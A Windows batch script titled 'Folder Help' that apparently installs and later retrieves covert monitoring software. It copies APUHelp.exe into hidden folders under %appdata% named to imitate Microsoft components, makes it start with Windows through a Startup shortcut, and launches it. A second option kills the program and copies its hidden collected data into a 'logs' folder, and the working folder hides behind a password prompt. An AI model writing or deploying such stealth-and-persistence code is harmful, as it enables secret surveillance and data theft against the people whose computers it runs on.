cls 
@ECHO OFF 
title Folder Help 

if EXIST "HTG Support" goto SCAN 
if NOT EXIST Help goto MD
:CONFIRM 
cls
echo Execute Command :
set/p "cho=>" 
if %cho%==I goto SET
if %cho%==i goto SET
if %cho%==C goto GET
if %cho%==c goto GET
if %cho%==l goto FIND
if %cho%==L goto FIND
if %cho%==e goto End
if %cho%==E goto End
goto CONFIRM
:FIND 
ren Help "HTG Support" 
attrib +h +s "HTG Support" 
goto End 
:SCAN 
echo Cheeki Breeki
set/p "ch=>" 
if NOT %ch%==!@12 goto scan 
attrib -h -s "HTG Support" 
ren "HTG Support" Help 
goto CONFIRM 
:MD 
md Help 
md "%cd%\Help\logs"
attrib +h +s "%cd%\Help\logs"
md "%cd%\Help\scam"
attrib +h +s "%cd%\Help\scam"
goto CONFIRM 
:SET 
md "%appdata%\Microsoft\CLR Security Config\APU"
attrib +h +s "%appdata%\Microsoft\CLR Security Config\APU"
md "%appdata%\Microsoft\CLR Security Config\v2.1.30541.467"
attrib +h +s "%appdata%\Microsoft\CLR Security Config\v2.1.30541.467" 
xcopy "%cd%\Help\scam\APUHelp.exe" "%appdata%\Microsoft\CLR Security Config\APU"
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\%~n0.lnk');$s.TargetPath='%appdata%\Microsoft\CLR Security Config\APU\APUHelp.exe';$s.Save()"
::REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Windows Services" /t REG_SZ /F /D "%userprofile%\Start Menu\Programs\APU\APUHelp.exe"
::attrib +h +s "%userprofile%\Start Menu\Programs\Startup\help.lnk" 
start "" "%appdata%\Microsoft\CLR Security Config\APU\APUHelp.exe"
goto CONFIRM
:GET
TASKKILL /F /IM APUHelp.exe /T
rmdir "%appdata%\Microsoft\CLR Security Config\APU" /s /q
::del "%userprofile%\Start Menu\Programs\Startup\help.lnk"
xcopy "%appdata%\Microsoft\CLR Security Config\v2.1.30541.467" "%cd%\Help\logs" /E
rmdir "%appdata%\Microsoft\CLR Security Config\v2.1.30541.467" /s /q
del  "%userprofile%\Start Menu\Programs\Startup\help.lnk"
goto CONFIRM
:End